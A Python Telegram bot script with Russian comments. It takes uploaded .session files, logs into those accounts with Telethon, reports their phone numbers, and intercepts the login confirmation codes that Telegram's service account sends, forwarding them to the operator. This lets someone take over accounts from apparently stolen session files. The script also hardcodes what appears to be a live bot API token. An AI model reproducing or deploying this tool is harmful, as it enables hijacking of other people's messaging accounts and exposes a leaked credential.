import os
import re
import asyncio
from telethon import TelegramClient, events
from aiogram import Bot, Dispatcher, executor, types

# --- ТВОИ ДАННЫЕ (ОБЯЗАТЕЛЬНО) ---
API_TOKEN = '8730929027:AAFvBfgHiDZSpUh1ybh2A5hQXPDdVPWMTxM'
API_ID = 1234567  # Получи на my.telegram.org
API_HASH = 'abcdef12345'  # Получи на my.telegram.org
ADMIN_ID = 12345678  # Твой ID в телеграм (узнай у @userinfobot)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


# Функция для работы с аккаунтом из файла
async def process_account(session_path, message):
    # 1. Бот "входит" в аккаунт, используя файл
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            await message.reply("❌ Ошибка: Сессия нерабочая (умерла).")
            return

        # 2. Бот сам узнает номер телефона этого аккаунта
        me = await client.get_me()
        phone = f"+{me.phone}" if me.phone else "Номер скрыт"

        await message.reply(
            f"✅ Вход выполнен!\n📱 **Номер аккаунта:** `{phone}`\n\nТеперь вводи этот номер в приложении. Как только придет код — я его пришлю.")

        # 3. Бот начинает "слушать" код от Telegram
        @client.on(events.NewMessage(from_users=777000))
        async def code_handler(event):
            # Ищем 5 цифр кода в тексте сообщения
            code = re.findall(r'\b\d{5}\b', event.message.message)
            if code:
                await message.answer(f"🔑 **КОД ПОДТВЕРЖДЕНИЯ: `{code[0]}`**")

        # Держим соединение активным 10 минут, пока ты входишь
        await asyncio.sleep(600)

    except Exception as e:
        await message.reply(f"⚠ Ошибка при чтении файла: {e}")
    finally:
        await client.disconnect()
        # Удаляем временный файл после работы
        if os.path.exists(session_path):
            os.remove(session_path)


# Обработка входящего файла .session
@dp.message_handler(content_types=['document'])
async def handle_session_file(message: types.Message):
    # Только ты можешь кидать файлы боту
    if message.from_user.id != ADMIN_ID:
        return

    if message.document.file_name.endswith('.session'):
        # Скачиваем файл во временную папку
        path = f"sessions/{message.document.file_name}"
        await message.document.download(destination_file=path)

        # Запускаем процесс входа и перехвата кода
        asyncio.create_task(process_account(path, message))
    else:
        await message.reply("Пришли файл формата .session")


if __name__ == '__main__':
    if not os.path.exists("sessions"): os.makedirs("sessions")
    print("Бот запущен. Отправь ему .session файл.")
    executor.start_polling(dp, skip_updates=True)